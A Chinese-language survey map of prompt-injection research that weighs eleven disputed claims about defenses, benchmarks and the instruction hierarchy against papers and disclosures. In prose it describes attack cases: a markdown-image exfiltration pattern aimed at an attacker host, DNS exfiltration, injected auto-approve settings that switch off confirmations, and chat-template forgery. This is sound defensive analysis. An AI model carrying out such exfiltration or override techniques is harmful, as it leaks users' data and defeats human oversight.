LLM 提示注入立场图

提示注入这片森林的形状和相邻领域相反:攻击侧几乎没有争议,争议全部集中在防御与评测。 没有人怀疑注入能打穿真实产品——2025 年一个人用一个月披露了 29 个;有争议的是 「哪个防御真的有效」「那些接近零的 ASR 数字算不算数」「这件事到底能不能被解决」。 这份图把整个领域重画成一张签名边的网络:谁继承谁、谁佐证谁、谁证伪谁, 并且不限于论文——一手漏洞披露、会议议题、厂商文档与立场文章与论文平权入图, 因为本领域最承重的那批记录根本不在 arXiv 上。

§1

这片森林在争什么

整个领域回答同一个问题:给你一个会读外部数据、又能动手的 LLM 应用,你能不能保证它只执行你的指令。 定义它的是一处结构性缺陷——指令和数据走同一条通道。 模型看到的是一整条文本流,「这段是开发者写的、那段是网页抓来的」这件事,在表示层面没有对应的隔离机制。 2022 年给它命名的那篇就说清了类比:这是 SQL 注入,要害不是「输入里有坏话」,而是拼接本身。

2023 到 2025 年,产品侧陆续给出四条工程假设。四条在三年里全部被打破,而且没有一条是被更强的优化打破的—— 打破它们的是朴素手法、是真实产品上的一次披露、是一个人花五美元买下的过期域名。

① 系统提示是一条安全边界
把规则写进 system message,再用指令层级训练加固。
上线三个月即被三种朴素手法绕过(改身份、查表间接化、要求转成 JSON 数组),结论是 system instructions continue to be suggestions。2026 年的机制工作给出解释: 模型按语气而不是按角色标签判断来源。
② 注入可以被检测出来
分类器筛输入、守卫模型判提示。
触发串可以被优化到形状与任何已知攻击都不像;微软专门为注入训练的 XPIA 分类器, 被一封通篇不提 AI 的邮件绕过。两家前沿实验室的公开文档现在写着: 在能可靠检测之前,只能上架构约束。
③ 关键动作让人确认就能兜底
危险操作弹窗、跨域跳转二次确认。
确认框防的是动作类别,注入需要的是数据流——「只是打字」几乎从不触发确认。 更糟的是 2026 年的对照数据:同一批危险命令,人工审查只拦下 13.6%,分类器 89%。
④ 出口是一份可以修完的清单
堵掉图片渲染和外链就没法外泄了。
六条反例逐一长出新分支:DNS 查询、搜索工具的 query、CSS 字体加载、 过期后被 5 美元买下的白名单域名、产品自己的 API。 出口不是清单,是任何能引发出站请求的机制。

①②是「模型能不能分清」的问题,③④是「系统给了它多大权限」的问题。 2026 年的三条不可能性结果把前一半基本封死了,于是整个领域的重心正在向后一半迁移—— 这正是图上「架构与能力控制」泳道 2025 年之后突然变密的原因。

四条已经不再有人争的事实

间接注入在真实产品上普遍可行,而且成本很低。2025 年 8 月,一名研究者用一个月披露了 29 个 agentic 漏洞,目标覆盖几乎所有主流编码 agent;其中两条拿到 CVE (Copilot 的远程代码执行、Claude Code 的 DNS 外泄)。 在此之后,「注入是理论风险」这个说法在工程界就没有再出现过。

外泄链条的最后一跳,几乎总是客户端自动发起的一个请求。 从 2023 年 ChatGPT 插件的 ![](attacker/q=DATA) 开始, 到 Bing、GitHub Copilot Chat、M365 Copilot、Bard、GitLab Duo、Cursor 的 Mermaid、Copilot 的 CSS 字体—— 同一个形状换了八年载体。厂商最终采用的修法也高度一致:不是检测注入,而是砍掉出口。

非自适应评测下的 ASR 数字不具信息量。2025 年的系统性工作把 12 个近期防御打穿、多数 ASR 超过 90%, 而这些防御原本大多报告接近零。同一年另有工作指出主流 agent 基准指标有缺陷、实现有 bug、攻击太弱, 一个简单的接口级方案就能在四个基准上全部打满。本图所有防御条目的注记都按这个先验打折。

指令-数据分离度低是结构性的,不是训练不到位。2024 年有人把「分离」定义成可测的量,发现所有模型都不高, 且提示工程与微调这两类常规缓解要么改善有限、要么掉效用。2026 年这件事被证成定理: 在共享嵌入架构里完美防护数学上不可能——溯源恢复的误差由全变差距离下界, 有限训练无法在无限语义等价类上认证不变性。

与两个姊妹项目最大的不同

第一处:这张图上近一半条目不是论文。98 条里有 44 条是漏洞披露、博客、议题、 竞赛靶场、厂商文档与立场文章。这不是为了凑数——本领域承重的记录本来就不在 arXiv 上: Dual LLM 模式在博客里躺了两年才被做成 CaMeL; 指令层级被绕的第一份证据是一篇博客; lethal trifecta 这条被 Meta 写进公司级安全框架的法则,原始出处是一篇个人博客。 只扫 arXiv 会漏掉这张图的一半骨架。

第二处:反驳边比佐证边少。图上 31 条反驳边对 69 条佐证边—— 而姊妹的越狱图正好相反(89 对 42)。原因不是这个领域更和谐: 是因为攻击侧几乎没有可争的——一手披露之间互相印证而不互相反驳, 真正的分歧集中在防御成色、评测口径与「可不可能被解决」这三处,也就是战线卡里的那 11 条。

第三处:理论泳道是厚的。越狱那张图的理论侧几乎空着(只有 3 个点); 这里有 8 个,而且含三条独立的不可能性结果: 共享嵌入下的不可分离定理、包装式防御的三难定理(在 Lean 4 里做过机器验证)、 以及从上下文完整性推出的博弈式不可能。 这三条从两端同时卡死了「分离 + 判定」这条主路线,是本领域相对同类问题少见的理论优势。

§2

十一条正在交火的战线

每条是一个具体命题,左边持它的条目、右边反对的条目——论文与一手披露、立场文章平权。裁定栏标的是证据成色,不是对错。 凡涉及 2026 年的 preprint,默认未复现;厂商自评数字一律标注为无法独立验证。每条卡片末尾的 note 第一句写的是 crux—— 双方为什么会得出不同结论,通常是威胁模型、攻击者预算或判定口径不同,而不是谁算错了。

01 提示注入可以被解决 已分层 · 「消除」已被证否，「限制后果」可行
可解派（工程上正在收敛）
  • CaMeL — 最强的构造性证据：把控制流与数据流从可信 query 里显式抽出来，不可信数据永远影响不了 program flow，AgentDojo 上以可证安全的方式完成 77% 的任务（无防御为 84%）2503.18813
  • Meta SecAlign — 模型侧的存在性证明：只用通用指令微调样本训练，却在未见的下游任务（工具调用、网页导航）上也带来安全性，70B 版比若干带防御的闭源旗舰更安全 2507.02735
  • 2000 人来打 — 野外的正面数据点：约 2,000 人、约 6,000 次尝试打一个 Opus 4.6 助手，零次成功
  • auto mode — 厂商侧数字：72 个注入场景 720 次攻击全部未成功，且 auto mode 拦下 89% 的有害动作
  • CommandSans — 原则性做法有效：token 级净化把 AgentDojo 的 ASR 从 34% 降到 3%，跨五个基准 7–10 倍下降且不掉效用 2510.08829
不可能派（结构性障碍）
  • 不可分离定理 — 目前唯一的不可能性证明：在缺乏强制控制-数据分离的共享嵌入架构里，完美防护数学上不可能；三条支撑分别是溯源恢复不可能（界由全变差距离给出）、控制路径暴露、有限覆盖不变性缺口 2606.27567
  • 上下文完整性 — 从另一端封死：主流的数据-指令分离范式既检测不了语境操纵、又损害合乎语境的正常行为；博弈式结论是攻击者总能构造让被拦流看起来合法的语境 2605.17634
  • 防御三难 — 对包装式防御的定理：连续性、效用保持、完备性三者不可兼得，且在 Lean 4 里做了机器验证 2604.06436
  • 角色混淆 — 机制层面的坏消息：模型判断文本来自谁靠的是它听起来像谁，注入文本占据它所模仿的可信角色的同一表示空间 2603.12277
  • 也许永远不安全 — 立场侧的概括：让 LLM 有用的那套能力本身就构成攻击面，因此这不是能靠打补丁收敛的问题
crux 是量词位置：「消除注入」与「限制注入的后果」被当成了同一个命题。两边的结论其实都成立且互不矛盾——不可能性定理管的是共享管线内的完美防护，而 CaMeL、Jatmo、Rule of Two 这些有效方案全都在管线之外（换系统、换模型、换权限）。
这条战线承重在哪：它决定了研究资源该往哪投。如果读成「注入可解」，就会继续在管线内堆分类器与对齐；如果读成「注入无解」，又会放弃本来做得到的后果限制。正确的读法是第三种：管线内的防护是概率性的、必被自适应攻击穿透；确定性的收益只能来自架构与权限。
注意 2000 人来打 与 auto mode 这两条正面证据的性质——它们是没被打穿的记录，不是打不穿的证明，这正是 偏差常态化 警告的那种推理。
02 防御论文报告的 ASR 数字是可信的 已证伪 · 非自适应评测下的数字不具信息量
按原报告读（数字本身是真的）
  • Spotlighting — GPT 家族上 ASR 从 >50% 降到 <2%，任务效用基本不损 2403.14720
  • SecAlign — 自述首个把各类注入成功率压到 <10%，且对比训练时复杂得多的攻击也成立 2410.05451
  • PromptArmor — AgentDojo 上 FPR 与 FNR 均 <1%，清洗后 ASR <1%，作者建议当作新防御的标准基线 2507.15219
  • BIPIA — 白盒防御把 ASR 降到接近零且保持输出质量 2312.14197
  • 防火墙 — 两道接口级防火墙在 AgentDojo / ASB / InjecAgent / tau-Bench 四个基准上全部达到 perfect security 2510.05244
按自适应口径读（数字大多是评测产物）
  • 攻击者后手 — 最直接的证伪：系统调优梯度下降、强化学习、随机搜索与人工引导后打穿 12 个近期防御，多数 ASR >90%，而这些防御原本大多报告接近零 2510.09023
  • 批判性评测 — 方法论层面的指控：既有研究缺少原则性评估，按「有效性（含自适应攻击）+ 通用效用」两维重评，既有防御没有原报告那么成功 2505.18333
  • 防火墙 — 自证式的反例：正是它自己指出四个基准指标有缺陷、实现有 bug、攻击太弱，所以「perfect security」说明的是基准上限 2510.05244
  • IH 断在哪 — 同一防御的对照数字：最强自监控在 GPT-5.3 上静态攻击降低 86%，自适应攻击只有 45% 2606.07808
  • 防御 SoK — 归纳出六条被绕过的根因并据此设计三种自适应攻击，显著抬高针对具体框架的 ASR 2511.15203
  • PIArena — 统一平台重测的三条结论：跨任务泛化差、扛不住自适应攻击、注入任务与目标任务对齐时原理上难分辨 2604.08499
crux 是评测流程，不是防御强度。注意 防火墙 同时站在两侧——它拿到了满分，并且用这个满分去指控基准，这是本图里最干净的一次自指式论证。
实操判据（本图采用的口径）：看到「ASR 降到 X%」先问三件事——(1) 攻击者是否知道防御的存在并针对它优化？(2) 攻击预算是多少？(3) 通用效用掉了多少？三问缺一，数字按 攻击者后手 的先验打折。
本图所有防御条目的注记都按这个口径写。这也是它与姊妹项目 llm-jailbreak-tracker 共享的唯一一条判定规则。
03 指令层级是一条安全边界 已反转 · 原作者没这么主张，产品侧当成了边界
层级派（训练能把优先级教会）
  • 指令层级 — 原始方案：冲突时让模型选择性忽略低权限指令，在 GPT-3.5 上对未见过的攻击类型鲁棒性显著提升 2404.13208
  • ISE — 把优先级从提示文本搬进段嵌入，Structured Query 基准 +15.75%、Instruction Hierarchy 基准 +18.68%，指令遵循还涨了 4.1% 2410.09102
  • SecAlign — 用偏好优化给出负例梯度，把层级从数据配方推进到训练目标 2410.05451
  • Meta SecAlign — 开源验证：模型级防御确实能泛化到未见的 agentic 任务 2507.02735
非边界派（层级只是先验，不是隔离）
  • IH 被绕 — 上线三个月内的一手反证，三种朴素手法：改身份、查表间接化、要求把系统消息转成 JSON 数组；结论是 system instructions continue to be suggestions, rather than a security boundary
  • IH 断在哪 — 两年后的白盒确认：失败分成识别、冲突解决、回应实现三段，主导失败模式随模型/任务/上下文长度变化，说明不是数据配方能补完的 2606.07808
  • 角色混淆 — 机制解释：模型按语气而不是按角色标签判断来源，CoT Forgery 对前沿模型 60% 成功，且混淆程度在生成第一个 token 前就能预测成败 2603.12277
  • 系统级立场 — 立场修正：依赖上下文的安全判断仍然需要 LLM，但必须放在严格限制它能看到什么、能决定什么的系统里 2603.30016
  • ChatInject — 直接伪造 chat template，比任何分隔符都更像真的边界；AgentDojo 5.18%→32.05% 2509.22830
crux 在量词位置，而且这次是产品侧读错的。原文的主张是「在多数情况下优先服从高权限指令」，这是一条统计先验；被读成的却是「低权限指令不能覆盖高权限指令」，这是一条隔离性质。
两者的区别正是概率与不变式的区别——前者可以被优化攻击穿过，后者不能。不可分离定理 说明后者在共享管线里根本拿不到（2606.27567）。
承重在哪：几乎所有产品的系统提示里都写着「不要执行用户内容里的指令」，并据此把机密放进系统提示。这条战线的结论直接说明这种做法不构成保护。
04 检测注入这条路线还有前途 未决 · 但两家前沿实验室已按「不可依赖」设计系统
可检测派（信号确实存在）
  • Attention Tracker — 机制侧信号：注入成功时 important heads 把注意力从原指令挪走（distraction effect），免训练检测，AUROC 最多 +10.0% 2411.00348
  • PIShield — 更省的同路线：指令微调 LLM 的残差流本来就编码了可分信号，线性分类器即可，不微调不生成 2510.14005
  • DataSentinel — 一开始就把自适应攻击写进目标：minimax 博弈式微调检测器 2504.11358
  • MELON — 换判据而不换特征：用掩码用户提示重放轨迹、比较动作相似度，AgentDojo 上优于当时 SOTA 2502.05174
  • CommandSans — 绕开「判断是不是攻击」这个难题，改成 token 级删除一切指向 AI 的指令 2510.08829
不可检测派（检测是在追会跑的靶子）
  • Neural Exec — 判决书式的结果：触发串可以被优化到形状与任何已知攻击都不像，从而绕过黑名单式检测与净化，还能穿过 RAG 预处理管线 2403.03792
  • EchoLeak — 生产环境的反例：微软专门为注入训练的 XPIA 分类器，被一封「通篇不提 AI」的邮件绕过 2509.10540
  • MCP Colors — 直接把不可检测当作设计前提：可靠检测注入不可能，而且大概永远不可能
  • Rule of Two — 一家前沿实验室的公开表述：until robustness research allows us to reliably detect and refuse prompt injection，因此只能上架构约束
  • 防御三难 — 对这一类包装式防御的不可能性：连续、保效用、完备三者不可兼得 2604.06436
crux 是攻击者预算，不是检测精度。所有正面结果都在固定分布上测（已知攻击族、公开基准），而 Neural Exec 证明了分布本身可以被优化着移动。
内部信号派（Attention Tracker → PIShield）押的是一个尚未被检验的赌注：残差流比文本更难被优化欺骗。这个赌注至今没有被一次正面的自适应攻击检验过——本图认为这是当前最值得做的一个实验。
判定为未决而不是证伪的理由：检测作为纵深防御的一层仍有价值（能提高攻击成本、能触发告警）；被证伪的是把它当作唯一防线。两家实验室的措辞已经默认了后者。
05 堵住出口就能挡住数据外泄 已证伪（作为唯一防线）· 出口是会长新分支的集合
出口管控派（承认进口堵不住，改堵出口）
  • Lockdown Mode — 产品化：限制出站网络请求，官方定位是阻断注入攻击的最后一段；已向多个 ChatGPT 档位铺开
  • Copilot Chat — 厂商修法的原型：GitHub 的修复不是检测注入，而是不再渲染 markdown 图片，直接砍掉出口
  • 分层防御 — Google 的五层里有两层属于出口侧：Markdown 净化与可疑 URL 删除（用 Safe Browsing 判链接）
  • Rule of Two — 把「对外通信」列为三条属性之一，从架构上限制它与另外两条同时出现
出口不可枚举派（每修一个就长出一个新的）
  • Claude Code DNS — 出口换成 DNS：ping/nslookup/dig/host 在免批准白名单里，绕过 HTTP 代理与域名白名单（CVE-2025-55284）
  • ForcedLeak — 出口是过期的白名单域名：CSP 允许的 Salesforce 相关域名已过期，研究者花 5 美元买下来即成为可信外泄目标
  • Cowork 外泄 — 出口是白名单里的自家 API：api.anthropic.com 在允许列表上，攻击者用自己的 key 把文件传上去再取回
  • Notion 3.0 — 出口是搜索工具：把数据拼进搜索 query，后端日志即接收端
  • Copirate 365 — 出口是 CSS @font-face：图片和链接都堵上之后，字体加载仍能发起出站请求（CVE-2026-24299）
  • Antigravity — 出口是默认白名单里的 webhook.site，经浏览器子 agent 发出
crux 是「出口」这个集合的可枚举性。产品团队默认它是一份可以修完的清单（图片、链接、表单）；六条反例说明它是任何能引发出站请求的机制——包括 DNS、搜索、字体、日志、以及本产品自己的 API。
两种失效方式要分开记：白名单条目过期后被抢注（ForcedLeak）与白名单条目本身合法但可被借用（Cowork）。前者是传统安全问题，后者无法靠维护清单解决。
结论不是别做出口管控——它确实把攻击成本抬高了一个量级；而是出口管控的强度等于白名单里最弱的那一条，因此它只能是纵深里的一层。
06 关键动作让人来确认就安全了 已反转 · 人在环拦得比分类器差
人在环派
  • 最坏会怎样 — 最早的三条建议之一就是「关键动作要确认」，另两条是展示生成的提示与教育开发者
  • Rule of Two — 兜底条款：三条属性都需要时，agent 应当在人在环批准下运行
  • 分层防御 — Google 五层里的第四层就是用户确认框架（例：删除日历事件要显式批准）
  • Operator — OpenAI 当时确实部署了三层：人盯着看、会话内确认、跨域导航的独立确认弹窗
人在环失效派
  • auto mode — 最刺眼的一组对照：1,053 名付费开发者的研究里，权限提示被换成明显危险的命令时，人工审查只拦下 13.6%，而分类器拦下 89%
  • Operator — 绕法朴素到不需要技巧：只是打字几乎从不触发任何确认，于是攻击者不点按钮，改用输入框把数据敲出去
  • Copilot RCE — 确认机制被放在 agent 的写权限之内：注入让 Copilot 往 .vscode/settings.json 写 chat.tools.autoApprove: true，把所有确认一次性关掉（CVE-2025-53773）
  • Dual LLM — 作者自评里就写了这条限制：用户仍可能被劝说去手动复制粘贴一段混淆数据，所以不是 100% 可靠
  • 偏差常态化 — 机制解释：反复确认而没出事，会让人把点「同意」变成肌肉记忆
crux 是「确认」到底在确认什么。产品实现的是动作类别的确认（要不要执行这条命令、要不要跳转），而攻击者需要的是数据流（把这段字符送到那个地方）。Operator 那条把这个错位暴露得最干净：打字不是一个需要批准的动作类别，却是一条完整的外泄通道。
13.6% 这个数字方向与直觉相反，是本图 2026 年最重要的经验发现之一：它动摇的正是 Rule of Two 的兜底条款——如果三条属性都需要时的补救是人在环，而人在环只有 13.6% 的拦截率，那么这个兜底并不牢。
注意这条战线的两侧都在同一个方向上修正：没有人主张取消确认，争的是能不能把它当成安全控制来计入威胁模型。
07 公开基准上的成绩反映真实的 agent 安全性 已证伪 · 基准饱和，且任务形状与真实 agent 不同
基准有效派
  • AgentDojo — 事实上的标准靶场：97 个真实任务、629 个安全测例，且刻意做成可扩展环境而非静态测试集 2406.13352
  • InjecAgent — 第一个工具集成 agent 基准：1,054 测例、17 用户工具、62 攻击者工具，30 个 agent 上 ReAct-GPT-4 24% 中招 2403.02691
  • ASB — 铺到四个阶段：系统提示、用户提示、工具使用、记忆检索，最高平均 ASR 84.30% 2410.02644
  • BIPIA — 间接注入的第一个专门基准，结论是被测模型普遍脆弱 2312.14197
基准失真派
  • 防火墙 — 一个简单的接口级方案就在四个基准上全部打满，作者据此指控：指标定义有缺陷、实现有 bug、最要命的是攻击太弱 2510.05244
  • ChatInject — 同一批基准换个载荷形状就翻倍：AgentDojo 5.18%→32.05%、InjecAgent 15.13%→45.90% 2509.22830
  • ARGUS — 形状层面的批评：既有基准的任务是 context-insensitive 的（用户提示已说清要做什么），而真实 agent 必须根据运行时证据决策 2605.03378
  • 威胁全景 — 在标准基准上有效的若干防御，到真实 agent 场景就不泛化 2602.10453
  • WASP — 端到端才看得见的东西：攻击最高在 86% 的情形下部分得手，但 agent 常常完不成攻击者的最终目标——security by incompetence 2504.18575
  • 防御 SoK — 六条根因 + 三种针对性自适应攻击，把多个「有效防御」重新打开 2511.15203
crux 是攻击者预算与任务形状两处同时失真，方向相反。攻击太弱让防御成绩偏高；任务过于简单（用户提示已指明动作）又让防御显得比真实场景容易做。两个偏差叠加，基准分数与真实安全性之间没有稳定关系。
security by incompetence 是这条战线最该被记住的概念（WASP）：一部分「攻击没成功」的观测，原因是 agent 太笨而不是防御有效。这部分安全性会随 agent 能力提升而无声消失，而基准分数不会提示这件事。
本图的处理：所有引用基准分数的注记都标注基准名与年份；跨基准、跨年份比较 ASR 一律视为无效。
08 注入的根因是模型能力/训练不足 已分层 · 训练能抬高门槛，消除不了根因
训练派（可以教会模型不上当）
  • 指令层级 — 数据生成法让模型选择性忽略低权限指令，对未见攻击类型鲁棒性显著提升 2404.13208
  • SecAlign — 偏好优化把注入成功率压到 <10%，且泛化到比训练时复杂得多的攻击 2410.05451
  • Meta SecAlign — 只用通用指令微调样本，安全性却迁移到工具调用与网页导航等未见任务 2507.02735
  • 防守 Gemini — 厂商侧持续自适应评测直接回喂模型改进 2505.14534
  • auto mode — 前沿模型上 72 个注入场景 720 次攻击全未成功
架构派（共用一条通道就必然混淆）
  • SEP 分离度 — 把问题定义清楚：所有被测模型分离度都不高，而提示工程与微调这两类常规缓解要么改善有限、要么掉效用 2403.06833
  • 不可分离定理 — 结构性结论：共享嵌入内溯源恢复不可能、控制路径暴露、有限训练无法认证无限语义等价类上的不变性 2606.27567
  • ASIDE — 反向证据：对 data token 的 embedding 施加正交旋转，不做专门安全训练也更抗注入 2503.10566
  • Jatmo — 存在性证明：干脆不用指令微调模型，最强攻击成功率 <0.5%（对照 GPT-3.5-Turbo 的 87%） 2312.17673
  • CaMeL — 把安全性移出模型：不可信数据永远影响不了控制流，代价是 84%→77% 的任务完成率 2503.18813
  • StruQ — 中间路线的自陈局限：结构化查询仍是统计意义上的分离，没有机制保证模型不能听 2402.06363
crux 是「根因」与「门槛」被混为一谈。训练派的证据全部是门槛类的（更难攻、成功率更低），架构派的证据是性质类的（在共享管线里拿不到不变式）。两类证据可以同时为真。
Jatmo 与 ASIDE 是这条战线上最经济的两个论证：一个说「把指令微调拿掉，注入就没有支点」，一个说「把数据 token 旋转开，不训安全也更稳」——两者都说明问题出在通道共享，而不是模型不够聪明。
本图观察到的一个统计事实支持架构派：被反复打穿的防御全在管线内（分类器、提示划界、偏好优化），没被打穿的全在管线外（换模型、换系统、换权限）。
09 野外的提示注入已经是普遍的真实攻击 未决 · 「普遍存在」与「被用于攻击」是两回事
已成常态派
  • 野外普查 — 唯一的规模数据：扫 1.2B 个 URL / 24.8M 个主机，在 11.7K 个页面上得到 15.3K 条已验证注入实例，约 70% 藏在不渲染的 HTML 元素里 2604.27202
  • AI Bug 月 — 一个人、一个月、29 篇 agentic 漏洞披露，覆盖几乎所有主流编码 agent
  • EchoLeak — 生产系统上的零点击外泄，拿到了 CVE-2025-32711 2509.10540
  • GitLab Duo、ForcedLeak、Notion 3.0 — 三个不同行业的商用产品上同一形状的外泄链
  • Antigravity — 厂商已把「经浏览器 agent 的注入导致外泄与代码执行」列为已知问题且不计赏金
尚未被真正利用派
  • 野外普查 — 同一篇的反向读法：野外注入的目标多是干扰、声誉操纵、内容保护指令与 AI-bot 检测，更像站点在跟爬虫赌气，而不是攻击 2604.27202
  • 2000 人来打 — 约 6,000 次真实尝试零成功，说明前沿模型的抗注入训练确实抬高了门槛
  • 也许永远不安全 — 作者自己承认的现状：至今没有出现百万美元级的损失，行业因此不认真
  • WASP — 攻击最高 86% 部分得手，但 agent 常完不成攻击者的最终目标 2504.18575
  • CIA 三元组 — 已公开的真实案例几乎全部来自安全研究者的负责任披露，不是在野攻击 2412.06090
crux 是把「注入存在的频率」当成了「注入被用于攻击的频率」。两侧引的是同一批事实，只是分子分母不同：野外普查同时是两边最强的证据——注入确实到处都是，但绝大多数不是冲着窃取数据来的。
这条战线的判定直接影响优先级。如果读成「已成常态」，就该按事件响应投入；如果读成「尚未被利用」，风险就是 偏差常态化 描述的那条路径——反复没出事被当成安全，防护被逐步撤掉。
本图的立场：两边都别过度解读。已确证的是能力（研究者随时能做出来）与普遍性（网页里到处都是），未确证的是规模化的在野利用。缺的是数据而不是论证——没有人在系统性地统计真实攻击，这是本领域最大的经验空白。
10 MCP / 工具生态的权限模型能管住注入 未决 · 组合授权是新问题，方案刚出现
能管住派（把权限做对即可）
  • MCP Colors — 直接对症：给每个输入与工具染色（red=引入不可信指令，blue=关键动作），一个 agent 只能要一种，用 _meta 携带颜色、运行时自查
  • CaMeL — 用 capability 在工具调用处强制策略，阻断未授权的数据外流 2503.18813
  • 设计模式 — 六种可证抗注入的设计模式与各自的效用-安全权衡，跨 ETH/IBM/微软/Google/Lakera 的工程共识 2506.08837
  • ARGUS — 因果溯源审计：只有当良性证据蕴含该动作且任务不变式成立才放行，ASR 28.8%→3.8%、干净效用保住 87.5% 2605.03378
  • AgentArmor — 把轨迹当程序做静态分析（CFG/DFG/PDG + 类型系统），AgentDojo 上 ASR 降到 3%、效用掉 1% 2508.01249
尚未管住派（生态跑在权限模型前面）
  • GitHub MCP — 问题形状的原型：每一步调用单独看都被授权，组合起来的效果没有被任何人授权（toxic agent flow）
  • Supabase MCP — 权限错配：MCP 跑在 service_role 下，按设计绕过全部行级安全——数据库的权限模型完全正确，错的是把代表所有人的凭据交给会听陌生人话的进程
  • 恶意 Skill — 供应链面：不可见 Unicode 指令藏进 skill 文件，人工 review 看不出来
  • AI Bug 月 — 生态现状的横截面：主流 agent 与 MCP 集成中，缺失的安全控制是常态而非例外
  • 防御 SoK — 对这一类框架的系统评测：六条根因 + 三种自适应攻击 2511.15203
crux 是授权的粒度：单次调用 vs 调用序列。传统权限模型（OAuth scope、RLS、文件权限）都是逐次判定的，而注入攻击的收益来自组合。这是本领域相对传统安全真正新的一处，也是最值得二进制/系统安全背景的人下手的地方。
染色（MCP Colors）之所以重要，是因为它把组合爆炸变回线性：不必枚举所有工具组合，只需保证任一 agent 会话不同时持有两种颜色。这与 CaMeL 的 capability、ARGUS 的溯源是同一族解法的三个粒度。
判为未决的原因很实际：这些方案基本都还没进入默认配置。生态侧的默认值仍是「把一个高权限凭据交给 agent」。
11 提示注入和越狱是同一类问题 已定 · 定义上不同，但术语至今仍在混用
合并派（实践中一起处理）
  • HackAPrompt — 摘要把两者合称 prompt hacking 一起收，600K+ 条对抗提示不区分类别 2311.16119
  • 攻击者后手 — 标题同时写了 jailbreaks 与 prompt injections，用同一套自适应攻击方法打两类防御 2510.09023
  • CyberSecEval 2 — 厂商评测套件把注入与其他 LLM 安全风险放进同一个框架 2404.13161
  • Gandalf — 众包红队平台上，玩家的攻击同时跨越两类 2501.07927
分开派（威胁模型不同）
  • 注入≠越狱 — 定义本身：注入攻击的是建立在 LLM 之上的应用，机制是不可信输入被拼接进可信提示；越狱攻击的是模型自带的安全过滤器。没有那个拼接就不叫注入
  • 间接注入 — 威胁模型的分水岭：攻击者根本不接触输入框，这在越狱里没有对应物 2302.12173
  • 致命三要素 — 风险形状不同：注入的后果由私有数据 + 对外通信决定，与模型愿不愿意说有害内容无关
  • 上下文完整性 — 判定标准不同：注入的合规性取决于信息流是否符合语境规范，而不是内容是否有害 2605.17634
crux 是「攻击谁」：模型的价值观，还是应用的信任边界。越狱要模型说出它被训练成不说的话；注入要应用代第三方执行动作。前者主要是声誉伤害（截图攻击），后者是数据与权限。
这条战线之所以还留着，是因为合并派的证据都是操作层面的——同一套优化器能打两边，同一个竞赛能收两边的样本。这不假，但方法相同不等于问题相同：模糊测试也能同时打出内存破坏和逻辑漏洞。
注意这条战线在图上两侧没有任何一条边相连——这本身就是发现：定义之争从没被正面打过，合并派继续合并、分开派继续分开，两边不引用对方。
本图与姊妹项目 llm-jailbreak-tracker 的分工就照 注入≠越狱 那条线切：横跨的条目（如 攻击者后手）在两图各取一半，并在双方的注记里写明取的是哪一半。

三条展开写的典型误读

这些说法在二手文献、产品文档和社媒里流传很广,逐条回到原文后都站不住。这里展开写三条; 图上另有 31 个梅紫虚线节点,点击对应节点即可看到具体误读与订正。

「指令层级上线了,系统提示现在受保护了」

原文给的是一套数据生成方法:当不同来源的指令冲突时,让模型选择性忽略低权限的那一方,并在 GPT-3.5 上对未见过的攻击类型显著提升鲁棒性。这是一条统计先验。被读成的却是「低权限指令不能覆盖高权限指令」,这是一条隔离性质——两者的差别正是概率与不变式的差别。上线三个月后,一名研究者用改身份、查表间接化、要求把系统消息转成 JSON 数组三种手法当场绕过,写下 system instructions continue to be suggestions, rather than a security boundary。两年后的白盒诊断把失败拆成识别、冲突解决、回应实现三段,并指出主导失败模式随模型与上下文长度变化。原作者从未把它称为安全边界——把机密放进系统提示的做法,不因这篇论文而变得安全。

「某防御在 AgentDojo 上把 ASR 降到 1% 以下,说明它有效」

2025 年 10 月有一篇论文在 AgentDojo / ASB / InjecAgent / tau-Bench 四个基准上全部达到 perfect security,用的只是接口处两道朴素的防火墙。而这篇论文的结论不是「我们解决了注入」,恰恰是用这个满分去指控基准:指标定义有缺陷、实现有 bug、最要命的是攻击太弱。同期另一篇只是把载荷伪装成模型自己的 chat template,就把 AgentDojo 从 5.18% 抬到 32.05%、InjecAgent 从 15.13% 抬到 45.90%。在一个攻击偏弱的基准上把 ASR 打到 1% 以下,说明的是基准的上限,不是防御的下限。引用这类数字时,把「四个基准满分」摘出来而丢掉后半句,等于把作者的结论反过来用。

「2,000 人打了 6,000 次都没成功,前沿模型已经免疫注入了」

这条实验是真的,转述它的人也写清了限定:抗注入训练确实让攻击难做得多,但 6,000 次失败不构成任何保证。更需要一起读的是另一个概念——security by incompetence:一份端到端 web agent 基准发现,攻击最高在 86% 的情形下部分得手,而 agent 之所以常常没造成后果,是因为它太笨,完不成攻击者的最终目标。这部分「安全性」不是任何人设计出来的,它会随 agent 能力提升而无声消失。把「没被打穿」读成「打不穿」,正是同期另一篇立场文章命名的那种推理:把没有成功攻击的记录,误当成稳健安全的存在。

Charles Ye, Jasmine Cui, Dylan Hadfield-Menell · ICML 2026 · 2026-02-22 · 图上标为「角色混淆」· 3 条边

结论一句话：To the model, sounding like a role is indistinguishable from being one. 所有靠标签、分隔符、模板划界的防御都下游于这一条。
